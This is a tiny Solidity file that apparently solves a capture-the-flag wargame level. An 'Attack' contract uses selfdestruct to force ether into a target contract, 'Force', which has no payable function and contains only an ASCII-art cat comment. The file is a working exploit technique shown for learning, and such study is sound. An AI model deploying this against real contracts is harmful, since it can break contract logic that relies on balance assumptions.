// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Attack {
    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}

// source code
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}